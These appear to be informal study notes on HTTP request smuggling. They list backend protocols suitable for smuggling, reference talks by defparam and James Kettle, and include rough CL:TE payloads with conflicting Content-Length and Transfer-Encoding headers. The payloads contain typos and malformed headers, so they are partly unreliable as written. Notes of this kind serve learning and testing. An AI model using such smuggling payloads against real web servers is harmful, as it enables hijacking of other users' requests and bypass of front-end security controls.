Protocols that are suitable to smuggle
HTTP based protocol
Elastic, CouchDB, Mongodb, Docker
Text-based protocol
FTP, SMTP, Redis, Memcached

## video
Practical Attacks Using HTTP Request Smuggling by @defparam #NahamCon2020

## 
James kettle http desync attacks :smashing into the cell next door




 CL:TE
BY CHANGING THE CONTENT LENGHT AND the text encoding we can bypass and mak requests

Post / HTTP/1.1
content-lenght:0
Transfer-Encoding  http / 1.1


post /login HTTP/1.1
[\0X01] transfer-Encoding:chunked 
Host:<host.com>
content lenght:35

0

GET /robots.txt
x:x


CL:TE
Content-Length: 12
Transfer-Encoding: chunked

0

G




